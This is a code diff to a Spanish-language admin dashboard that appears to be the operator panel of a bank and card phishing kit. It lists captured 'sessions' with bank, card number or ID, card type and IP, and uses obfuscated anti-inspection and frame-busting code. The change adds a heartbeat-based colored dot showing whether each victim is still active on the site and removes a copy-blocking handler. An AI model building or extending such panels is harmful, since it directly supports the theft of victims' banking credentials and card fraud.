@@ -7,7 +7,7 @@
 <meta name="robots" content="noindex, nofollow, noarchive">
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #0a0e1a; color: #e5e7eb; min-height: 100vh; font-size: 14px; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #0a0e1a; color: #e5e7eb; min-height: 100vh; font-size: 14px; user-select: text; }
 .hidden { display: none !important; }
 
 #loginScreen { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; background: linear-gradient(135deg, #0a0e1a 0%, #1a1f35 100%); }
@@ -151,7 +151,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 #toast.show { transform: translateX(0); }
 #toast.error { border-left-color: #ef4444; }
 
-/* ============================================================
+/* ============================================================ 
    LOGOS DE MARCA EN LA TABLA
    ============================================================ */
 .banco-cell {
@@ -276,6 +276,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                         <thead>
                             <tr>
                                 <th class="checkbox-col"><input type="checkbox" id="checkAllSesiones"></th>
+                                <th style="text-align:center; width: 40px;" title="Estado de conexión">●</th> <!-- 🔥 NUEVA COLUMNA -->
                                 <th>Banco</th>
                                 <th>Estado</th>
                                 <th>Identificación/Trj</th>
@@ -293,7 +294,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                             </tr>
                         </thead>
                         <tbody id="tbodySesiones">
-                            <tr><td colspan="15" class="empty">Cargando...</td></tr>
+                            <tr><td colspan="16" class="empty">Cargando...</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -703,7 +704,7 @@ function renderSesiones() {
         });
     }
     if (!lista.length) {
-        tbody.innerHTML = '<tr><td colspan="15" class="empty">Sin sesiones</td></tr>';
+        tbody.innerHTML = '<tr><td colspan="16" class="empty">Sin sesiones</td></tr>';
         actualizarBtnBorrarSesiones();
         return;
     }
@@ -738,6 +739,24 @@ function renderSesiones() {
         const ip = datos.ip || '-';
         const checked = seleccionSesiones.has(s.sessionId) ? 'checked' : '';
 
+        // Lógica de los 3 puntos
+        let colorPunto = '#22c55e'; // Verde (Activo por defecto)
+        let tituloPunto = 'Usuario activo';
+        const activoInfo = activosCache.find(a => a.sessionId === s.sessionId);
+
+        if (!activoInfo) {
+            colorPunto = '#ef4444'; // Rojo (Ya salió definitivamente)
+            tituloPunto = 'Usuario salió de forma definitiva';
+        } else {
+            const ahora = Date.now();
+            const ultimoHeartbeat = activoInfo.ultimoHeartbeat || 0;
+            const segundosInactivo = (ahora - ultimoHeartbeat) / 1000;
+            if (segundosInactivo > 15) {
+                colorPunto = '#fbbf24'; // Amarillo (Salió de la web o inactivo)
+                tituloPunto = 'Usuario salió de la web (Inactivo)';
+            }
+        }
+
         // Banco emisor + nivel de tarjeta (solo para tarjetas)
         const bancoEmisor = esTarjeta ? (datos.bankName || 'No identificado') : '-';
         const tipo = datos.cardType || '';
@@ -746,6 +765,9 @@ function renderSesiones() {
         return `
             <tr>
                 <td class="checkbox-col"><input type="checkbox" class="check-sesion" data-id="${escapeHtml(s.sessionId)}" ${checked}></td>
+                <td style="text-align:center;">
+                    <span title="${tituloPunto}" style="display:inline-block; width: 12px; height: 12px; border-radius: 50%; background-color: ${colorPunto}; box-shadow: 0 0 4px ${colorPunto};"></span>
+                </td>
                 <td>${nombreBanco(banco, datos.marca)}</td>
                 <td><span class="estado estado-${s.estado}">${s.estado}</span></td>
                 <td class="dato" title="${escapeHtml(identificacionTrj)}">${escapeHtml(truncar(identificacionTrj, 20))}</td>
@@ -1020,10 +1042,7 @@ if(_0xh8&&_0xg7==='p'){_0xf6.preventDefault();return false;}
 if(_0xh8&&_0xg7==='a'){_0xf6.preventDefault();return false;}
 });
 document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
-document.addEventListener('selectstart',function(_0xl1){
-var _0xm2=(_0xl1.target&&_0xl1.target.tagName)?_0xl1.target.tagName.toLowerCase():'';
-if(_0xm2!=='input'&&_0xm2!=='textarea'){_0xl1.preventDefault();}
-});
+// Se ha quitado el bloqueo de copiar/pegar (selectstart, copy, cut).
 try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xn3){document.body.innerHTML='';}
 
 var _0xo4=null;
